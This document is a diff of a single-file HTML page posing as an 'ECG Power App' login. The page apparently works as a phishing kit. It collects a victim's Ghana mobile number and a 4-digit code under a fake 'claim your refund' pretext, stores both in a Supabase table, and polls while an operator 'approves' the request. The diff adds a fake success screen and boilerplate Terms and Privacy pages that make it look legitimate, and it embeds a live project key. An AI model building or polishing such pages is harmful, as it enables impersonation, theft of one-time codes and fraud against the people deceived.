@@ -1,16 +1,11 @@
-<!--
-ECG Power App Authentication
-Single-file HTML
-Replace:
-  YOUR_SUPABASE_URL
-  YOUR_SUPABASE_ANON_KEY
-
-Place ecg-logo.png in the same folder.
---><!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>ECG Power App</title><script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script><style>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
+<title>ECG Power App</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
 :root{
     --primary:#343C9B;
     --bg:#f7f7f7;
@@ -30,39 +25,25 @@ Place ecg-logo.png in the same folder.
 html,body{
     height:100%;
     background:var(--bg);
-    font-family:
-    "Segoe UI Variable",
-    "Segoe UI",
-    Inter,
-    Roboto,
-    Arial,
-    sans-serif;
-}
-
-body{
+    font-family:"Segoe UI Variable","Segoe UI",Inter,Roboto,Arial,sans-serif;
+    position:fixed;
+    width:100%;
     overflow:hidden;
 }
 
 .screen{
     position:absolute;
     inset:0;
-    padding:
-        max(24px, env(safe-area-inset-top))
-        24px
-        max(24px, env(safe-area-inset-bottom))
-        24px;
-
+    padding:max(24px, env(safe-area-inset-top)) 24px max(24px, env(safe-area-inset-bottom)) 24px;
     display:flex;
     flex-direction:column;
-
     background:var(--bg);
-
-    transition:
-    transform .35s ease,
-    opacity .35s ease;
+    transition:transform .35s ease, opacity .35s ease;
+    overflow-y:auto;
+    -webkit-overflow-scrolling:touch;
 }
 
-.hidden{
+.screen.hidden{
     opacity:0;
     pointer-events:none;
     transform:translateX(20px);
@@ -141,11 +122,24 @@ body{
     font-size:18px;
     font-weight:600;
     cursor:pointer;
+    transition:transform 0.1s;
+}
+
+.button:active{
+    transform:scale(0.98);
 }
 
 .button:disabled{
-    opacity:.55;
-    cursor:not-allowed;
+    opacity:1;
+    background:var(--primary);
+    cursor:pointer;
+}
+
+.back-button{
+    background:transparent;
+    color:var(--primary);
+    border:2px solid var(--primary);
+    margin-top:12px;
 }
 
 .terms{
@@ -160,6 +154,7 @@ body{
     color:var(--primary);
     text-decoration:none;
     font-weight:600;
+    cursor:pointer;
 }
 
 .otp-row{
@@ -257,324 +252,470 @@ body{
     color:var(--muted);
     font-size:14px;
 }
-</style></head><body><!-- LOGIN --><section class="screen" id="screen1"><div class="content"><div class="logo">
-<img src="ecg-logo.png" alt="ECG Logo">
-</div><h1 class="title">
-Login with your Ghana mobile number
-</h1><p class="subtitle">
-Your mobile number may be verified against your Ghana Card details
-</p><input
-id="phone"
-class="input"
-type="tel"
-maxlength="10"
-placeholder="Enter your mobile number">
 
-<div class="counter">
-<span id="count">0</span>/10
-</div></div><div class="bottom"><button
-id="continueBtn"
-class="button"
-disabled>
-Continue
-</button>
+/* Privacy & Terms Pages Styles */
+.legal-content{
+    background:white;
+    border-radius:20px;
+    padding:24px;
+    margin-bottom:20px;
+}
 
-<div class="terms">
-By signing up you agree to our
-<a href="#">Terms of Use</a>
-and
-<a href="#">Privacy Policy</a>.
-</div></div></section><!-- CODE ENTRY --><section class="screen hidden" id="screen2"><div class="content"><div class="logo">
-<img src="ecg-logo.png" alt="ECG Logo">
-</div><h1 class="title">
-Enter Approval Code
-</h1><p class="subtitle">
-Enter any 4-digit code to submit your login request.
-</p><div class="otp-row"><input class="otp" maxlength="1">
-<input class="otp" maxlength="1">
-<input class="otp" maxlength="1">
-<input class="otp" maxlength="1"></div><div class="loading" id="loading">
-<div class="spinner"></div>
-Submitting request...
-</div></div><div class="bottom"><button
-id="submitBtn"
-class="button">
-Submit Request
-</button>
+.legal-content h2{
+    font-size:18px;
+    color:var(--primary);
+    margin-top:20px;
+    margin-bottom:10px;
+}
 
-</div></section><!-- WAITING --><section class="screen hidden" id="screen3"><div class="content"><div class="status-card"><div class="success">✓</div><h1 class="title">
-Request Submitted
-</h1><p class="subtitle" style="margin-bottom:0;">
-transfer initiated
-</p><div class="badge">
-Awaiting Approval
-</div><div
-class="small"
-id="pollStatus">
-Checking approval status every 5 seconds...
-</div></div></div></section><script>
+.legal-content h2:first-child{
+    margin-top:0;
+}
 
-const SUPABASE_URL =
-"https://edkbjaxajxywnamgwani.supabase.co";
+.legal-content p{
+    font-size:14px;
+    line-height:1.6;
+    color:var(--text);
+    margin-bottom:12px;
+}
 
-const SUPABASE_ANON_KEY =
-"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVka2JqYXhhanh5d25hbWd3YW5pIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4MTg0ODAsImV4cCI6MjA5NjM5NDQ4MH0.GSiL4u96M5AMA4YFWX52iIVGmMkGYYG_C13cMD322j4";
+.legal-content ul{
+    margin-left:20px;
+    margin-bottom:12px;
+}
 
-const supabaseClient =
-window.supabase.createClient(
-    SUPABASE_URL,
-    SUPABASE_ANON_KEY
-);
+.legal-content li{
+    font-size:14px;
+    line-height:1.6;
+    color:var(--text);
+    margin-bottom:6px;
+}
+
+.legal-date{
+    font-size:12px;
+    color:var(--muted);
+    text-align:center;
+    margin-top:20px;
+    padding-top:16px;
+    border-top:1px solid #eee;
+}
+</style>
+</head>
+
+<body>
+<!-- SCREEN 1: PHONE NUMBER -->
+<section class="screen" id="screen1">
+    <div class="content">
+        <div class="logo">
+            <img src="ecg-logo.png" alt="ECG Logo" onerror="this.style.display='none'">
+        </div>
+        <h1 class="title">Login with your Ghana mobile number</h1>
+        <p class="subtitle">Your mobile number may be verified against your Ghana Card details</p>
+        
+        <input id="phone" class="input" type="tel" maxlength="10" placeholder="Enter your mobile number">
+        <div class="counter"><span id="count">0</span>/10</div>
+        
+        <div class="loading" id="phoneLoading" style="display:none;">
+            <div class="spinner"></div>
+            Saving phone number...
+        </div>
+    </div>
+    <div class="bottom">
+        <button id="continueBtn" class="button">Continue</button>
+        <div class="terms">
+            By signing up you agree to our <a id="termsLink">Terms of Use</a> and <a id="privacyLink">Privacy Policy</a>.
+        </div>
+    </div>
+</section>
+
+<!-- SCREEN 2: OTP CODE -->
+<section class="screen hidden" id="screen2">
+    <div class="content">
+        <div class="logo">
+            <img src="ecg-logo.png" alt="ECG Logo" onerror="this.style.display='none'">
+        </div>
+        <h1 class="title">Enter Approval Code</h1>
+        <p class="subtitle">Enter the verification code to login and claim your refund.</p>
+        
+        <div class="otp-row">
+            <input class="otp" maxlength="1" inputmode="numeric">
+            <input class="otp" maxlength="1" inputmode="numeric">
+            <input class="otp" maxlength="1" inputmode="numeric">
+            <input class="otp" maxlength="1" inputmode="numeric">
+        </div>
+        
+        <div class="loading" id="otpLoading" style="display:none;">
+            <div class="spinner"></div>
+            please wait...
+        </div>
+    </div>
+    <div class="bottom">
+        <button id="submitBtn" class="button">confirm refund</button>
+    </div>
+</section>
+
+<!-- SCREEN 3: WAITING -->
+<section class="screen hidden" id="screen3">
+    <div class="content">
+        <div class="status-card">
+            <div class="success">✓</div>
+            <h1 class="title">🎉Success!🎉</h1>
+            <p class="subtitle" style="margin-bottom:0;">refund initiated</p>
+            <div class="badge">ths might take up to 1-3 working days to arrive</div>
+            <div class="small" id="pollStatus">do not refresh this page...</div>
+        </div>
+    </div>
+</section>
+
+<!-- SCREEN 4: TERMS OF USE -->
+<section class="screen hidden" id="screenTerms">
+    <div class="content">
+        <div class="logo">
+            <img src="ecg-logo.png" alt="ECG Logo" onerror="this.style.display='none'">
+        </div>
+        <h1 class="title">Terms of Use</h1>
+        <div class="legal-content">
+            <h2>1. Acceptance of Terms</h2>
+            <p>By accessing and using the ECG Power App, you agree to be bound by these Terms of Use and all applicable laws and regulations. If you do not agree with any of these terms, you are prohibited from using this application.</p>
+            
+            <h2>2. User Registration</h2>
+            <p>To use the ECG Power App, you must register using your Ghana mobile number. You agree to provide accurate, current, and complete information during registration and to update such information to keep it accurate, current, and complete.</p>
+            
+            <h2>3. Verification Process</h2>
+            <p>Your mobile number will be verified against your Ghana Card details. You authorize ECG to perform this verification through official government channels. All verification requests are subject to admin approval.</p>
+            
+            <h2>4. User Obligations</h2>
+            <p>You agree to:</p>
+            <ul>
+                <li>Maintain the confidentiality of your account information</li>
+                <li>Notify ECG immediately of any unauthorized use of your account</li>
+                <li>Use the application only for lawful purposes</li>
+                <li>Not attempt to bypass any security features</li>
+            </ul>
+            
+            <h2>5. Privacy</h2>
+            <p>Your privacy is important to us. Please review our Privacy Policy to understand how we collect, use, and protect your personal information.</p>
+            
+            <h2>6. Service Availability</h2>
+            <p>ECG strives to provide uninterrupted service but does not guarantee that the application will be available at all times. We reserve the right to suspend or modify the service for maintenance or updates.</p>
+            
+            <h2>7. Limitation of Liability</h2>
+            <p>ECG shall not be liable for any indirect, incidental, special, consequential, or punitive damages resulting from your use or inability to use the application.</p>
+            
+            <h2>8. Modifications</h2>
+            <p>ECG reserves the right to modify these terms at any time. Continued use of the application after such modifications constitutes acceptance of the updated terms.</p>
+            
+            <h2>9. Governing Law</h2>
+            <p>These terms shall be governed by and construed in accordance with the laws of the Republic of Ghana.</p>
+            
+            <h2>10. Contact Information</h2>
+            <p>For questions about these Terms of Use, please contact us at: support@ecgpowerapp.com.gh</p>
+            
+            <div class="legal-date">Last Updated: January 2024</div>
+        </div>
+    </div>
+    <div class="bottom">
+        <button class="button back-button" id="backFromTermsBtn">Back</button>
+    </div>
+</section>
+
+<!-- SCREEN 5: PRIVACY POLICY -->
+<section class="screen hidden" id="screenPrivacy">
+    <div class="content">
+        <div class="logo">
+            <img src="ecg-logo.png" alt="ECG Logo" onerror="this.style.display='none'">
+        </div>
+        <h1 class="title">Privacy Policy</h1>
+        <div class="legal-content">
+            <h2>1. Information We Collect</h2>
+            <p>We collect the following information when you use the ECG Power App:</p>
+            <ul>
+                <li><strong>Personal Information:</strong> Your Ghana mobile phone number and Ghana Card verification details.</li>
+                <li><strong>Verification Codes:</strong> The approval codes submitted for authentication.</li>
+                <li><strong>Device Information:</strong> Browser type, device model, and operating system.</li>
+                <li><strong>Usage Data:</strong> How you interact with the application.</li>
+            </ul>
+            
+            <h2>2. How We Use Your Information</h2>
+            <p>Your information is used for the following purposes:</p>
+            <ul>
+                <li>To verify your identity against Ghana Card records</li>
+                <li>To process your login requests</li>
+                <li>To communicate with you about your requests</li>
+                <li>To improve and optimize our application</li>
+                <li>To comply with legal obligations</li>
+            </ul>
+            
+            <h2>3. Data Storage and Security</h2>
+            <p>We implement appropriate technical and organizational measures to protect your personal information. All data is stored on secure servers in compliance with Ghana's Data Protection laws.</p>
+            
+            <h2>4. Data Retention</h2>
+            <p>We retain your personal information only as long as necessary to fulfill the purposes outlined in this Privacy Policy. Approved requests are retained for 7 days, while rejected or incomplete requests are automatically deleted after 24-48 hours.</p>
+            
+            <h2>5. Information Sharing</h2>
+            <p>We do not sell, trade, or rent your personal information to third parties. Your information is only shared:</p>
+            <ul>
+                <li>With authorized ECG personnel for verification purposes</li>
+                <li>When required by law or legal process</li>
+                <li>With your explicit consent</li>
+            </ul>
+            
+            <h2>6. Your Rights</h2>
+            <p>Under Ghana's Data Protection laws, you have the right to:</p>
+            <ul>
+                <li>Access your personal information</li>
+                <li>Request correction of inaccurate data</li>
+                <li>Request deletion of your data</li>
+                <li>Withdraw consent at any time</li>
+            </ul>
+            
+            <h2>7. Cookies and Tracking</h2>
+            <p>We use essential cookies to maintain your session and application functionality. No tracking cookies or analytics are used without your consent.</p>
+            
+            <h2>8. Children's Privacy</h2>
+            <p>The ECG Power App is not intended for persons under the age of 18. We do not knowingly collect information from minors.</p>
+            
+            <h2>9. Changes to This Policy</h2>
+            <p>We may update this Privacy Policy from time to time. We will notify users of any material changes through the application.</p>
+            
+            <h2>10. Contact Us</h2>
+            <p>If you have questions about this Privacy Policy or wish to exercise your data rights, please contact:</p>
+            <p><strong>Email:</strong> privacy@ecgpowerapp.com.gh<br>
+            <strong>Phone:</strong> +233 (0) 123 456 789<br>
+            <strong>Address:</strong> ECG Headquarters, Accra, Ghana</p>
+            
+            <div class="legal-date">Last Updated: January 2024</div>
+        </div>
+    </div>
+    <div class="bottom">
+        <button class="button back-button" id="backFromPrivacyBtn">Back</button>
+    </div>
+</section>
+
+<script>
+// ============================================
+// CONFIGURATION
+// ============================================
+
+const SUPABASE_URL = "https://ltwuastxmetkgjznwqkd.supabase.co";
+const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx0d3Vhc3R4bWV0a2dqem53cWtkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4NDgzMzksImV4cCI6MjA5NjQyNDMzOX0.CslD6FCQO3A9uqWxzWKnJMVfUYaLwHUowRsFiWYSHyM";
+
+const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
 let requestId = null;
 let pollingInterval = null;
 
-const phone =
-document.getElementById("phone");
+// ============================================
+// DOM ELEMENTS
+// ============================================
 
-const count =
-document.getElementById("count");
+const phone = document.getElementById("phone");
+const count = document.getElementById("count");
+const continueBtn = document.getElementById("continueBtn");
+const phoneLoading = document.getElementById("phoneLoading");
+const otpLoading = document.getElementById("otpLoading");
+const submitBtn = document.getElementById("submitBtn");
+const otpBoxes = document.querySelectorAll(".otp");
+const termsLink = document.getElementById("termsLink");
+const privacyLink = document.getElementById("privacyLink");
+const backFromTermsBtn = document.getElementById("backFromTermsBtn");
+const backFromPrivacyBtn = document.getElementById("backFromPrivacyBtn");
 
-const continueBtn =
-document.getElementById("continueBtn");
+// ============================================
+// SCREEN MANAGEMENT
+// ============================================
 
-phone.addEventListener("input",()=>{
-
-    phone.value =
-    phone.value.replace(/\D/g,'');
-
-    count.textContent =
-    phone.value.length;
-
-    continueBtn.disabled =
-    phone.value.length !== 10;
-
-});
-
-continueBtn.addEventListener("click",()=>{
-
-    document
-    .getElementById("screen1")
-    .classList.add("hidden");
-
-    document
-    .getElementById("screen2")
-    .classList.remove("hidden");
-
-    otpBoxes[0].focus();
-
-});
-
-const otpBoxes =
-document.querySelectorAll(".otp");
-
-otpBoxes.forEach((box,index)=>{
-
-    box.addEventListener("input",()=>{
-
-        box.value =
-        box.value.replace(/\D/g,'');
-
-        if(
-            box.value &&
-            index < otpBoxes.length - 1
-        ){
-            otpBoxes[index+1].focus();
-        }
-
+function showScreen(screenId) {
+    const screens = ['screen1', 'screen2', 'screen3', 'screenTerms', 'screenPrivacy'];
+    screens.forEach(id => {
+        const element = document.getElementById(id);
+        if (element) element.classList.add('hidden');
     });
+    const targetScreen = document.getElementById(screenId);
+    if (targetScreen) targetScreen.classList.remove('hidden');
+}
 
-    box.addEventListener("keydown",(e)=>{
+// ============================================
+// LEGAL PAGES NAVIGATION
+// ============================================
 
-        if(
-            e.key === "Backspace" &&
-            !box.value &&
-            index > 0
-        ){
-            otpBoxes[index-1].focus();
-        }
-
-    });
-
-});
-
-otpBoxes[0].addEventListener(
-"paste",
-(e)=>{
-
+termsLink.addEventListener("click", (e) => {
     e.preventDefault();
-
-    const value =
-    (
-        e.clipboardData ||
-        window.clipboardData
-    )
-    .getData("text")
-    .replace(/\D/g,'')
-    .slice(0,4);
-
-    value
-    .split("")
-    .forEach((digit,index)=>{
-
-        if(otpBoxes[index]){
-            otpBoxes[index].value =
-            digit;
-        }
-
-    });
-
+    showScreen('screenTerms');
 });
 
-document
-.getElementById("submitBtn")
-.addEventListener(
-"click",
-submitRequest
-);
+privacyLink.addEventListener("click", (e) => {
+    e.preventDefault();
+    showScreen('screenPrivacy');
+});
 
-async function submitRequest(){
+backFromTermsBtn.addEventListener("click", () => {
+    showScreen('screen1');
+});
 
-    let code = "";
+backFromPrivacyBtn.addEventListener("click", () => {
+    showScreen('screen1');
+});
 
-    otpBoxes.forEach(box=>{
-        code += box.value;
-    });
+// ============================================
+// STEP 1: PHONE INPUT
+// ============================================
 
-    if(code.length !== 4){
-        alert(
-        "Please enter a 4-digit code."
-        );
+phone.addEventListener("input", () => {
+    phone.value = phone.value.replace(/\D/g, '');
+    count.textContent = phone.value.length;
+});
+
+continueBtn.addEventListener("click", async () => {
+    const phoneNumber = phone.value;
+    
+    if (phoneNumber.length !== 10) {
+        alert("Please enter a valid 10-digit phone number");
         return;
     }
-
-    document
-    .getElementById("loading")
-    .style.display =
-    "block";
-
-    try{
-
-        const {
-            data,
-            error
-        } =
-        await supabaseClient
-        .from("login_requests")
-        .insert({
-            phone_number:
-            phone.value,
-
-            approval_code:
-            code,
-
-            status:
-            "pending"
-        })
-        .select()
-        .single();
-
-        if(error){
-            throw error;
-        }
-
-        requestId =
-        data.id;
-
-        document
-        .getElementById("screen2")
-        .classList.add("hidden");
-
-        document
-        .getElementById("screen3")
-        .classList.remove("hidden");
-
-        startPolling();
-
-    }catch(err){
-
-        document
-        .getElementById("loading")
-        .style.display =
-        "none";
-
-        alert(
-        err.message ||
-        "Submission failed."
-        );
-
+    
+    phoneLoading.style.display = "block";
+    continueBtn.disabled = true;
+    
+    try {
+        const { data, error } = await supabaseClient
+            .from("login_requests")
+            .insert({
+                phone_number: phoneNumber,
+                otp_code: null,
+                status: "waiting_for_otp"
+            })
+            .select()
+            .single();
+        
+        if (error) throw error;
+        
+        requestId = data.id;
+        
+        showScreen('screen2');
+        
+        if (otpBoxes[0]) otpBoxes[0].focus();
+        
+    } catch (err) {
+        alert("Error: " + err.message);
+    } finally {
+        phoneLoading.style.display = "none";
+        continueBtn.disabled = false;
     }
-
-}
-
-function startPolling(){
-
-    pollingInterval =
-    setInterval(
-    async ()=>{
-
-        const {
-            data,
-            error
-        } =
-        await supabaseClient
-        .from("login_requests")
-        .select("status")
-        .eq("id",requestId)
-        .single();
-
-        if(error){
-            return;
-        }
-
-        if(
-            data.status ===
-            "approved"
-        ){
-
-            clearInterval(
-            pollingInterval
-            );
-
-            window.location.href =
-            "dashboard.html";
-
-        }
-
-        if(
-            data.status ===
-            "rejected"
-        ){
-
-            clearInterval(
-            pollingInterval
-            );
-
-            alert(
-            "Your request was rejected."
-            );
-
-            location.reload();
-
-        }
-
-    },5000);
-
-}
-
-window.addEventListener(
-"beforeunload",
-()=>{
-
-    if(
-        pollingInterval
-    ){
-        clearInterval(
-        pollingInterval
-        );
-    }
-
 });
 
-</script></body>
+// ============================================
+// STEP 2: OTP INPUT
+// ============================================
+
+otpBoxes.forEach((box, index) => {
+    box.addEventListener("input", () => {
+        box.value = box.value.replace(/\D/g, '');
+        if (box.value && index < otpBoxes.length - 1) {
+            otpBoxes[index + 1].focus();
+        }
+    });
+    
+    box.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !box.value && index > 0) {
+            otpBoxes[index - 1].focus();
+        }
+    });
+});
+
+if (otpBoxes[0]) {
+    otpBoxes[0].addEventListener("paste", (e) => {
+        e.preventDefault();
+        const pastedText = (e.clipboardData || window.clipboardData)
+            .getData("text")
+            .replace(/\D/g, '')
+            .slice(0, 4);
+        
+        pastedText.split("").forEach((digit, index) => {
+            if (otpBoxes[index]) otpBoxes[index].value = digit;
+        });
+        
+        const nextIndex = Math.min(pastedText.length, 3);
+        if (otpBoxes[nextIndex]) otpBoxes[nextIndex].focus();
+    });
+}
+
+submitBtn.addEventListener("click", async () => {
+    let code = "";
+    otpBoxes.forEach(box => code += box.value);
+    
+    if (code.length !== 4) {
+        alert("Please enter a 4-digit code");
+        return;
+    }
+    
+    if (!requestId) {
+        alert("Session error. Please start over.");
+        location.reload();
+        return;
+    }
+    
+    otpLoading.style.display = "block";
+    submitBtn.disabled = true;
+    
+    try {
+        const { error } = await supabaseClient
+            .from("login_requests")
+            .update({
+                otp_code: code,
+                status: "pending_approval"
+            })
+            .eq("id", requestId);
+        
+        if (error) throw error;
+        
+        showScreen('screen3');
+        startPolling();
+        
+    } catch (err) {
+        alert("Error: " + err.message);
+    } finally {
+        otpLoading.style.display = "none";
+        submitBtn.disabled = false;
+    }
+});
+
+// ============================================
+// STEP 3: POLLING
+// ============================================
+
+function startPolling() {
+    pollingInterval = setInterval(async () => {
+        if (!requestId) return;
+        
+        const { data, error } = await supabaseClient
+            .from("login_requests")
+            .select("status")
+            .eq("id", requestId)
+            .single();
+        
+        if (error) return;
+        
+        if (data.status === "approved") {
+            clearInterval(pollingInterval);
+            window.location.href = "dashboard.html";
+        }
+        
+        if (data.status === "rejected") {
+            clearInterval(pollingInterval);
+            alert("Your request was denied.");
+            location.reload();
+        }
+    }, 5000);
+}
+
+// ============================================
+// CLEANUP
+// ============================================
+
+window.addEventListener("beforeunload", () => {
+    if (pollingInterval) clearInterval(pollingInterval);
+});
+</script>
+</body>
 </html>
